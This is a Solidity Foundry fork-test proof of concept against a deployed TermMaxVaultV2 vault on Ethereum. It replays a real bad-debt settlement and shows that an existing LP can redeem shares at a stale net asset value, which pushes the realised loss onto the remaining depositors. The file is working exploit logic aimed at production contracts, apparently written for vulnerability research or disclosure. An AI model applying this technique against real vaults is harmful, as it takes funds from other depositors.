// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {IGearingToken} from "contracts/v1/tokens/IGearingToken.sol";
import {GtConfig} from "contracts/v1/storage/TermMaxStorage.sol";

interface IProductionTermMaxVault is IERC4626 {
    function redeemOrder(address order) external returns (uint256 badDebt, uint256 deliveryCollateral);
    function badDebtMapping(address collateral) external view returns (uint256);
    function pool() external view returns (IERC4626);
}

interface IProductionTermMaxOrder {
    function market() external view returns (address);
}

interface IProductionTermMaxMarket {
    function tokens() external view returns (address ft, address xt, address gt, address collateral, address debtToken);
}

/// @title TermMaxVaultV2 realized-loss / stale-NAV production fork PoC
/// @notice Deploys no contracts, mints no assets, changes no oracle, writes no storage, and
///         synthesizes no vault shares. It replays one real historical RedeemOrder transaction
///         at its exact Ethereum pre-transaction state and lets a real historical LP redeem.
/// @dev Fail-closed: zero bad debt, full economic collateral coverage, insufficient real
///      liquidity, a historical-event mismatch, or zero measurable loss shift fails the test.
contract TermMaxVaultStaleNavForkPoC is Test {
    uint256 internal constant USD_BASE = 1e8;
    bytes32 internal constant ORDER_REDEEMED_TOPIC = keccak256("Redeemed(address,uint256,uint256,bytes)");

    struct SettlementState {
        address vaultAddress;
        address attacker;
        IProductionTermMaxVault vault;
        IERC20 asset;
        IERC4626 pool;
        IGearingToken gt;
        address collateral;
        uint256 totalAssetsBefore;
        uint256 totalSupplyBefore;
        uint256 attackerShares;
        uint256 badDebtDelta;
        uint256 deliveryDelta;
        uint256 deliveryValueInAsset;
        uint256 realizedLoss;
    }

    function testFork_RealSettlementLetsExistingLPShiftRealizedLossToRemainingLPs() public {
        SettlementState memory state = _forkAndSettle();

        uint256 nominalPayout = state.vault.previewRedeem(state.attackerShares);
        assertGt(nominalPayout, 0, "selected existing shares have no redeemable value");

        uint256 economicAssets = state.vault.totalAssets() - state.realizedLoss;
        uint256 fairEconomicPayout =
            Math.mulDiv(state.attackerShares, economicAssets + 1, state.totalSupplyBefore + 1, Math.Rounding.Floor);
        uint256 lossShift = nominalPayout - fairEconomicPayout;
        assertGt(lossShift, 0, "settlement does not create a measurable stale-NAV exit advantage");

        uint256 liquidCapacity = state.asset.balanceOf(state.vaultAddress);
        if (address(state.pool) != address(0)) {
            liquidCapacity += state.pool.maxWithdraw(state.vaultAddress);
        }
        assertGe(liquidCapacity, nominalPayout, "insufficient real liquidity for ordinary redeem");

        uint256 badDebtBeforeExit = state.vault.badDebtMapping(state.collateral);
        uint256 collateralBeforeExit = IERC20(state.collateral).balanceOf(state.vaultAddress);
        uint256 assetBeforeExit = state.asset.balanceOf(state.attacker);

        vm.prank(state.attacker);
        uint256 assetsOut = state.vault.redeem(state.attackerShares, state.attacker, state.attacker);

        assertEq(assetsOut, nominalPayout, "redeem did not pay the stale nominal quote");
        assertEq(
            state.asset.balanceOf(state.attacker) - assetBeforeExit,
            nominalPayout,
            "real LP did not receive liquid underlying"
        );
        assertEq(
            state.vault.badDebtMapping(state.collateral),
            badDebtBeforeExit,
            "ordinary redeem unexpectedly retired bad debt"
        );
        assertEq(
            IERC20(state.collateral).balanceOf(state.vaultAddress),
            collateralBeforeExit,
            "ordinary redeem unexpectedly consumed delivered collateral"
        );

        uint256 actualRemainingEconomicAssets = state.vault.totalAssets() - state.realizedLoss;
        uint256 fairRemainingEconomicAssets = economicAssets - fairEconomicPayout;
        uint256 additionalLossForcedOnRemainingLPs = fairRemainingEconomicAssets - actualRemainingEconomicAssets;

        assertApproxEqAbs(
            additionalLossForcedOnRemainingLPs, lossShift, 2, "early-exit gain is not conserved as remaining-LP loss"
        );

        emit log_named_address("vault", state.vaultAddress);
        emit log_named_address("real exiting LP", state.attacker);
        emit log_named_address("settled order", vm.envAddress("TERM_MAX_ORDER"));
        emit log_named_uint("real bad debt raw", state.badDebtDelta);
        emit log_named_uint("delivered collateral raw", state.deliveryDelta);
        emit log_named_uint("delivered collateral value in asset raw", state.deliveryValueInAsset);
        emit log_named_uint("realized net loss raw", state.realizedLoss);
        emit log_named_uint("existing LP shares redeemed", state.attackerShares);
        emit log_named_uint("ordinary redeem payout raw", nominalPayout);
        emit log_named_uint("fair economic payout raw", fairEconomicPayout);
        emit log_named_uint("loss shifted to remaining LPs raw", lossShift);
    }

    function _forkAndSettle() internal returns (SettlementState memory state) {
        string memory rpc = vm.envString("MAINNET_RPC_URL");
        bytes32 settlementTx = vm.envBytes32("TERM_MAX_SETTLEMENT_TX");
        uint256 fallbackPreBlock = vm.envUint("TERM_MAX_PRE_SETTLEMENT_BLOCK");

        try vm.createSelectFork(rpc, settlementTx) returns (uint256) {}
        catch {
            vm.createSelectFork(rpc, fallbackPreBlock);
        }

        state.vaultAddress = vm.envAddress("TERM_MAX_VAULT");
        state.vault = IProductionTermMaxVault(state.vaultAddress);
        state.asset = IERC20(state.vault.asset());
        state.pool = state.vault.pool();
        state.attacker = vm.envAddress("TERM_MAX_SHARE_SOURCE");
        state.attackerShares = vm.envUint("TERM_MAX_ATTACKER_SHARES");

        address order = vm.envAddress("TERM_MAX_ORDER");
        address settlementCaller = vm.envAddress("TERM_MAX_SETTLEMENT_CALLER");
        uint256 expectedBadDebt = vm.envUint("TERM_MAX_EXPECTED_BAD_DEBT_RAW");
        uint256 expectedDelivery = vm.envUint("TERM_MAX_EXPECTED_DELIVERY_RAW");

        assertGt(state.attackerShares, 0, "TERM_MAX_ATTACKER_SHARES is zero");
        assertGe(
            state.vault.balanceOf(state.attacker),
            state.attackerShares,
            "selected LP did not really own these shares before settlement"
        );

        state.totalAssetsBefore = state.vault.totalAssets();
        state.totalSupplyBefore = state.vault.totalSupply();
        assertGt(state.totalSupplyBefore, state.attackerShares, "no remaining shares after selected exit");

        address marketAddress = IProductionTermMaxOrder(order).market();
        IProductionTermMaxMarket market = IProductionTermMaxMarket(marketAddress);
        (, , address gtAddress, address collateral, address debtToken) = market.tokens();
        assertEq(debtToken, address(state.asset), "order debt token differs from vault asset");

        state.gt = IGearingToken(gtAddress);
        state.collateral = collateral;

        uint256 badDebtBefore = state.vault.badDebtMapping(collateral);
        uint256 collateralBefore = IERC20(collateral).balanceOf(state.vaultAddress);

        // Capture the exact opaque deliveryData emitted by the deployed Order during the
        // real settlement. This avoids previewRedeem assumptions and avoids reconstructing
        // protocol-specific collateralData off-chain.
        vm.recordLogs();
        vm.prank(settlementCaller);
        (uint256 badDebtReturned, uint256 deliveryReturned) = state.vault.redeemOrder(order);
        Vm.Log[] memory entries = vm.getRecordedLogs();

        bytes memory actualDeliveryData;
        bool orderRedeemedEventFound;
        for (uint256 i; i < entries.length; ++i) {
            Vm.Log memory entry = entries[i];
            if (entry.emitter != order || entry.topics.length < 2 || entry.topics[0] != ORDER_REDEEMED_TOPIC) continue;

            address eventRecipient = address(uint160(uint256(entry.topics[1])));
            (uint256 orderDebtTokenAmount, uint256 orderBadDebt, bytes memory deliveryData) =
                abi.decode(entry.data, (uint256, uint256, bytes));
            orderDebtTokenAmount;
            assertEq(eventRecipient, state.vaultAddress, "Order Redeemed recipient is not the vault");
            assertEq(orderBadDebt, expectedBadDebt, "Order Redeemed badDebt differs from vault event");
            actualDeliveryData = deliveryData;
            orderRedeemedEventFound = true;
            break;
        }
        assertTrue(orderRedeemedEventFound, "deployed Order Redeemed event not observed");

        state.badDebtDelta = state.vault.badDebtMapping(collateral) - badDebtBefore;
        state.deliveryDelta = IERC20(collateral).balanceOf(state.vaultAddress) - collateralBefore;

        assertEq(badDebtReturned, expectedBadDebt, "fork result differs from historical badDebt event");
        assertEq(deliveryReturned, expectedDelivery, "fork result differs from historical delivery event");
        assertEq(state.badDebtDelta, expectedBadDebt, "bad-debt mapping delta differs from event");
        assertEq(state.deliveryDelta, expectedDelivery, "collateral balance delta differs from event");
        assertGt(state.badDebtDelta, 0, "selected production settlement has zero bad debt");

        // For zero delivery this is exactly zero. For nonzero delivery this values the exact
        // bytes produced by the real deployed settlement through TermMax's own GT/oracle path.
        if (expectedDelivery == 0) {
            state.deliveryValueInAsset = 0;
        } else {
            state.deliveryValueInAsset = _deliveryValueInAsset(state.gt, address(state.asset), actualDeliveryData);
        }

        assertEq(
            state.vault.totalAssets(),
            state.totalAssetsBefore,
            "settlement unexpectedly recognized bad debt in totalAssets"
        );
        assertEq(state.vault.totalSupply(), state.totalSupplyBefore, "settlement changed share supply");

        // Emit the exact protocol-oracle classification before the fail-closed loss check so
        // non-exploitable production settlements also serve as explicit negative controls.
        emit log_named_uint("classification bad debt raw", state.badDebtDelta);
        emit log_named_uint("classification delivery value in asset raw", state.deliveryValueInAsset);

        assertGt(
            state.badDebtDelta,
            state.deliveryValueInAsset,
            "delivered collateral economically covers the bad debt; no realized net loss"
        );
        state.realizedLoss = state.badDebtDelta - state.deliveryValueInAsset;
        assertLt(state.realizedLoss, state.vault.totalAssets(), "selected loss exceeds nominal vault assets");
    }

    function _deliveryValueInAsset(IGearingToken gt, address asset, bytes memory deliveryData)
        internal
        view
        returns (uint256)
    {
        if (deliveryData.length == 0) return 0;

        uint256 collateralValueUsd = gt.getCollateralValue(deliveryData);
        GtConfig memory config = gt.getGtConfig();
        (uint256 assetPrice, uint8 assetPriceDecimals) = config.loanConfig.oracle.getPrice(asset);
        require(assetPrice != 0, "protocol debt-token oracle returned zero");

        uint256 assetUnit = 10 ** IERC20Metadata(asset).decimals();
        uint256 priceUnit = 10 ** assetPriceDecimals;
        uint256 valueAtUsdBase = Math.mulDiv(collateralValueUsd, assetUnit, USD_BASE);
        return Math.mulDiv(valueAtUsdBase, priceUnit, assetPrice);
    }
}
